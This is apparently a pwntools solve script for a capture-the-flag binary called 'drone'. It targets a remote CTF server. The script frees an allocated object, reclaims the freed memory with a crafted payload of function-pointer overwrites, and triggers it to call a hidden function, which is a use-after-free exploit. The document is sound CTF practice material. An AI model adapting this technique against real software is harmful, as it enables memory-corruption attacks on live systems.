#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './challenge/drone'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'uap.ctf.intigriti.io', 1340

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def alloc():
    io.sendline(b'1')

def free(idx):
    io.sendline(b'2')
    io.sendline(str(idx).encode())

def start(idx):
    io.sendline(b'3')
    io.sendline(str(idx).encode())
    
def route(route):
    io.sendline(b'4')
    io.sendline(route)

def exploit():
    global io
    io = initialize()

    alloc()
    free(1)

    payload = b'A' * 0x10 + p64(elf.sym['print_drone_manual']) * 2
    route(payload)

    start(1)

    io.interactive()
    
if __name__ == '__main__':
    exploit()
